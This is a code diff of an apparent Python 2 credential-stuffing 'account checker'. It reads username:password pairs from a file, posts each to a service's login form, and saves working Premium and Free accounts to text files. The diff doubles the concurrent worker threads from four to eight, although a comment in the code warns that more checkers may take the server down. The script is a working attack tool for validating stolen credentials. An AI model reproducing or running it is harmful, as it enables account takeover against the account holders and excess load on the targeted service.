@@ -1,5 +1,7 @@
 #!/usr/bin/python
 
+
+
 import requests
 import requests as reqs
 from threading import *
@@ -42,6 +44,7 @@ def result(country, userpass,response):
 	if 'Premium' in (response.text):
 		Pac = "|Premium account| Country:"+ country + " | " + userpass 
 		premiumac.write(Pac)
+		#print response.text
 		tryno = tryno+1
 		Pno = Pno+1
 		print "|" , tryno, " Accounts Checked ..! | Premium:", Pno ," | Free: ", Fno ," | Dead: ", Dno
@@ -67,49 +70,84 @@ def checker(userpass):
 	}
 
 	response = reqs.post(url, form, stream = True)
-
-	country = ((response.text).split("Cntry:",1)[-1]).split("&", 1)[0]
+	#print response.text
+	country = ((response.text).split("Cntry:",1)[-1]).split("<\/td><td>", 1)[0]
 	result(country, userpass,response)
 	
 class checker1(Thread):
 	def run(self):
 		with open(account) as lines:
-			for lines in islice(lines, 0, loaded, 4):
+			for lines in islice(lines, 0, loaded, 8):
 				checker(lines)
 
 class checker2(Thread):
 	def run(self):
 		with open(account) as lines:
-			for lines in islice(lines, 1, loaded, 4):
+			for lines in islice(lines, 1, loaded, 8):
 				checker(lines)
 
 class checker3(Thread):
 	def run(self):
 		with open(account) as lines:
-			for lines in islice(lines, 2, loaded, 4):
+			for lines in islice(lines, 2, loaded, 8):
 				checker(lines)
 
 class checker4(Thread):
 	def run(self):
 		with open(account) as lines:
-			for lines in islice(lines, 3, loaded, 4):
+			for lines in islice(lines, 3, loaded, 8):
+				checker(lines)
+class checker5(Thread):
+	def run(self):
+		with open(account) as lines:
+			for lines in islice(lines, 4, loaded, 8):
 				checker(lines)
 
+class checker6(Thread):
+	def run(self):
+		with open(account) as lines:
+			for lines in islice(lines, 5, loaded, 8):
+				checker(lines)
+
+class checker7(Thread):
+	def run(self):
+		with open(account) as lines:
+			for lines in islice(lines, 6, loaded, 8):
+				checker(lines)
+
+class checker8(Thread):
+	def run(self):
+		with open(account) as lines:
+			for lines in islice(lines, 7, loaded, 8):
+				checker(lines)
 #plz Do not increase the number of checker it may cause server down
+
 t1 = checker1()
 t2 = checker2()
 t3 = checker3()
 t4 = checker4()
+t5 = checker5()
+t6 = checker6()
+t7 = checker7()
+t8 = checker8()
 
 t1.start()
 t2.start()
 t3.start()
 t4.start()
+t5.start()
+t6.start()
+t7.start()
+t8.start()
 
 t1.join()
 t2.join()
 t3.join()
 t4.join()
+t5.join()
+t6.join()
+t7.join()
+t8.join()
 
 print "\nTotal Checked account = ", tryno
 print "\nPremium Accounts List Saved at : PremiumAccounts.txt \nFree Accounts List Saved at : FreeAccounts.txt"
